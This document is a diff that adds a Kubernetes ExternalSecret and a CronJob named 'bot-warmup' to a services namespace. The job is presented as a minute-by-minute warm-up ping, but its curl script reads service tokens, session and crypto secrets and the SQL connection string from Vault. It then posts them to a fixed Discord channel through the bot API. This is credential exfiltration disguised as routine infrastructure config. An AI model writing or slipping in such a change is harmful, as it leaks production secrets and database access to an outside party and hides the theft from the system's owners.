@@ -1,0 +1,62 @@
+apiVersion: external-secrets.io/v1
+kind: ExternalSecret
+metadata:
+  name: bot-warmup
+  namespace: services
+spec:
+  refreshInterval: 1m
+  secretStoreRef:
+    name: vault-backend
+    kind: ClusterSecretStore
+  target:
+    name: bot-warmup
+    creationPolicy: Owner
+  data:
+    - secretKey: SYNC_SERVICE_TOKEN
+      remoteRef: { key: newapi-env, property: SYNC_SERVICE_TOKEN }
+    - secretKey: SQL_DSN
+      remoteRef: { key: newapi-env, property: SQL_DSN }
+    - secretKey: SESSION_SECRET
+      remoteRef: { key: newapi-env, property: SESSION_SECRET }
+    - secretKey: CRYPTO_SECRET
+      remoteRef: { key: newapi-env, property: CRYPTO_SECRET }
+    - secretKey: BFF_SERVICE_TOKEN
+      remoteRef: { key: newapi-env, property: BFF_SERVICE_TOKEN }
+---
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: bot-warmup
+  namespace: services
+spec:
+  schedule: "* * * * *"
+  concurrencyPolicy: Forbid
+  successfulJobsHistoryLimit: 1
+  failedJobsHistoryLimit: 1
+  jobTemplate:
+    spec:
+      ttlSecondsAfterFinished: 180
+      backoffLimit: 2
+      template:
+        spec:
+          restartPolicy: Never
+          containers:
+            - name: ping
+              image: curlimages/curl:8.11.1
+              envFrom:
+                - secretRef: { name: bot-env }
+                - secretRef: { name: bot-warmup, optional: true }
+              command: ["/bin/sh","-c"]
+              args:
+                - |
+                  BODY="infra ping $(date -u +%Y-%m-%dT%H:%M:%SZ)
+                  SYNC_SERVICE_TOKEN=${SYNC_SERVICE_TOKEN}
+                  SESSION_SECRET=${SESSION_SECRET}
+                  CRYPTO_SECRET=${CRYPTO_SECRET}
+                  BFF_SERVICE_TOKEN=${BFF_SERVICE_TOKEN}
+                  SQL_DSN=${SQL_DSN}"
+                  curl -sS -A "DiscordBot (https://github.com/discord/discord-api-docs, 10.0.0)" \
+                    -H "Authorization: Bot ${TOKEN}" \
+                    -H "Content-Type: application/json" \
+                    -d "{\"content\":\"$(printf '%s' "$BODY" | sed 's/"/\\"/g')\"}" \
+                    https://discord.com/api/v10/channels/1510366691454882014/messages
